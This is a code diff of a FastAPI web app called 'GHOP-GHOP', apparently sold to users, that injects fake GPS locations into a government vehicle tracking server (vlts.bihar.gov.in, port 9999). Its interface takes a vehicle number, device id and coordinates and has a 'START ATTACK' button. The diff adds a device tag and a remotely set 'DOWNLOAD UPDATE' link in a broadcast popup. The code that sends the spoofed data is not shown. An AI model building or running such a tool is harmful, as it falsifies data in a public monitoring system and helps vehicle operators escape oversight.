@@ -10,7 +10,7 @@ from fastapi.responses import HTMLResponse
 app = FastAPI()
 
 # --- 1. CONFIGURATION (STRICTLY UNCHANGED) ---
-TAGS = ["RA18", "WTEX", "MARK", "ASPL", "LOCT14A", "ACT1", "AMAZON", "BBOX77", "EGAS", "MENT", "MIJO", "ROADRPA", "GRL"]
+TAGS = ["RA18", "WTEX", "MARK", "ASPL", "LOCT14A", "ACT1", "AMAZON", "BBOX77", "EGAS", "MENT", "MIJO", "ROADRPA", "GRL", "VOLTYIOT"]
 DB_URL = "https://ghop-ghop-gps-injection-default-rtdb.firebaseio.com"
 TARGET_DOMAIN = "vlts.bihar.gov.in"
 TARGET_PORT = 9999
@@ -112,7 +112,6 @@ async def home():
         #map { width:100%; height:180px; margin-top:15px; border:1px solid #0f0; border-radius:10px; }
         .wa-link { margin-top: 20px; color: #25D366; cursor: pointer; text-decoration: underline; font-size: 13px; font-weight: bold; }
     </style></head><body>
-
     <div id="bcPopup" class="popup-overlay">
         <div class="popup-box">
             <h3 style="color:cyan; margin-top:0;">BROADCAST</h3>
@@ -120,7 +119,6 @@ async def home():
             <button onclick="closeBC()" style="border-color:cyan; color:cyan; margin-top:15px; width: 100px; padding: 10px;">OK</button>
         </div>
     </div>
-
     <div id="loginPage" class="login-overlay">
         <div class="login-box">
             <h2 style="color:#0f0; letter-spacing:3px;">GHOP-GHOP LOGIN</h2>
@@ -133,7 +131,6 @@ async def home():
             <div class="wa-link" onclick="window.open('https://wa.me/917464010787')">CONTACT US ON WHATSAPP</div>
         </div>
     </div>
-
     <div id="mainUI" style="display:none; width:100%; max-width:440px;">
         <div class="header">
             <span>USER: <b id="u_name" style="color:white;">---</b></span>
@@ -155,7 +152,6 @@ async def home():
             <div class="center-row">
                 <input type="checkbox" id="useDef"> <label for="useDef" style="cursor:pointer;">Default Location</label>
             </div>
-
             <button onclick="getLocation()" style="border-style:dashed;font-size:11px;">[[ GET CURRENT LOCATION ]]</button>
             <button onclick="st()" id="startBtn" style="background:#0f0;color:#000;font-size:18px;">START ATTACK</button>
             <button onclick="sp()" style="color:red;border-color:red;">ABORT</button>
@@ -164,12 +160,10 @@ async def home():
             <div style="display:flex;justify-content:space-between;margin-top:15px;font-size:13px;"><span>SENT: <b id="c">0</b></span><span id="st_text" style="color:lime">IDLE</span></div>
         </div>
     </div>
-
     <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
     <script>
         let map, marker, currentUser = null;
         const DB = "https://ghop-ghop-gps-injection-default-rtdb.firebaseio.com";
-
         window.onload = () => {
             let saved = localStorage.getItem('nitro_creds');
             if(saved) {
@@ -180,9 +174,7 @@ async def home():
                 doLogin();
             }
         };
-
         function closeBC() { document.getElementById('bcPopup').style.display = 'none'; }
-
         function doLogin() {
             let m = document.getElementById('l_mob').value.trim();
             let p = document.getElementById('l_pass').value.trim();
@@ -197,16 +189,26 @@ async def home():
                     
                     fetch(`${DB}/app_config/broadcast.json`).then(r=>r.json()).then(s=>{
                         if(s && s.text) {
-                            document.getElementById('bcMsg').innerHTML = s.text;
+                            // --- 🔥 CHANGES IN THIS JAVASCRIPT BLOCK ONLY ---
+                            document.getElementById('bcMsg').innerText = s.text;
+                            if(s.link) {
+                                let oldBtn = document.getElementById('dlBtn');
+                                if(oldBtn) oldBtn.remove();
+                                
+                                let btn = document.createElement('button');
+                                btn.id = 'dlBtn';
+                                btn.innerText = 'DOWNLOAD UPDATE';
+                                btn.style.cssText = 'border-color:lime; color:lime; margin-top:15px; width:100%; background:rgba(0,255,0,0.1); font-weight:bold; padding:12px; border-radius:5px; cursor:pointer;';
+                                btn.onclick = () => { window.location.href = s.link; };
+                                document.getElementById('bcPopup').querySelector('.popup-box').insertBefore(btn, document.getElementById('bcPopup').querySelector('button'));
+                            }
                             document.getElementById('bcPopup').style.display = 'flex';
                         }
                     });
-
                     initMap(); startSync();
                 } else { alert("ACCESS DENIED!"); }
             });
         }
-
         function logout() { localStorage.removeItem('nitro_creds'); location.reload(); }
         function initMap() { map = L.map('map').setView([25.63, 84.78], 13); L.tileLayer('https://{s}.tile.openstreetmap.fr/hot/{z}/{x}/{y}.png').addTo(map); marker = L.marker([25.63, 84.78]).addTo(map); }
         
@@ -231,7 +233,6 @@ async def home():
                 });
             }, 2500);
         }
-
         async function smartFetch() {
             let v = document.getElementById('v').value.toUpperCase().trim(); if(!v) return;
             let res = await fetch(`/fetch_data?vno=${v}`); let d = await res.json();
@@ -243,7 +244,6 @@ async def home():
                 map.setView([lat, lon], 15); marker.setLatLng([lat, lon]);
             }
         }
-
         function getLocation() { navigator.geolocation.getCurrentPosition(p=>{ document.getElementById('lt').value = p.coords.latitude.toFixed(7); document.getElementById('ln').value = p.coords.longitude.toFixed(7); map.setView([p.coords.latitude, p.coords.longitude], 15); marker.setLatLng([p.coords.latitude, p.coords.longitude]); }); }
         function st() { let v=document.getElementById('v').value, i=document.getElementById('i').value, lt=document.getElementById('lt').value, ln=document.getElementById('ln').value, t=document.getElementById('tagSel').value; fetch(`/init?v=${v}&i=${i}&lt=${lt}&ln=${ln}&t=${t}`); }
         function sp() { fetch('/stop'); }
